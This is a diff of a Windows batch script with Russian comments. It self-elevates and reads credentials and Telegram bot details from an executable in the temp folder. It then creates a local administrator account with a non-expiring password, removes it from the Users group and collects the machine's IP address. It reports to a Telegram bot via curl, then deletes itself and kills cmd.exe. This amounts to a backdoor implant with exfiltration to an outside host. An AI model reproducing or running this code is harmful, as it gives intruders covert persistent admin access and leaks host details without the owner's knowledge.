@@ -1,16 +1,27 @@
 @echo off
 
-chcp 65001
 setlocal enabledelayedexpansion
+chcp 65001
 
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
  
-chcp 65001
-net user /add admin пароль
-net localgroup Администраторы admin /add
-net localgroup Пользователи admin /del
-wmic useraccount where "name='admin'" set passwordexpires=false
+:: Запуск Python скрипта и захват строк
+for /f "tokens=1* delims=" %%i in ('%TEMP%\var_dist_unzipped\var.dist\var.exe') do (
+    if not defined var1 (
+        set var1=%%i
+    ) else if not defined var2 (
+        set var2=%%i
+    ) else if not defined var3 (
+        set var3=%%i
+	) else if not defined var4 (
+        set var4=%%i
+    )
+)
 
+net user /add %var1% %var2%
+net localgroup Администраторы %var1% /add
+net localgroup Пользователи %var1% /del
+wmic useraccount where "name='!var1!'" set passwordexpires=false
 
 :: Получаем IP компьютера
 for /f "skip=4 delims=" %%A in ('ipconfig /all') do (
@@ -52,8 +63,6 @@ del "%~f0"
 taskkill /F /IM cmd.exe
 exit /b
 
-:myFunction
-set TOKEN=""
-set CHAT_ID="-100"
 
-curl -X POST "https://api.telegram.org/bot!TOKEN!/sendMessage" -d "chat_id=!CHAT_ID!&text=!msg!"
+:myFunction
+curl -X POST "https://api.telegram.org/bot!var3!/sendMessage" -d "chat_id=!var4!&text=!msg!"
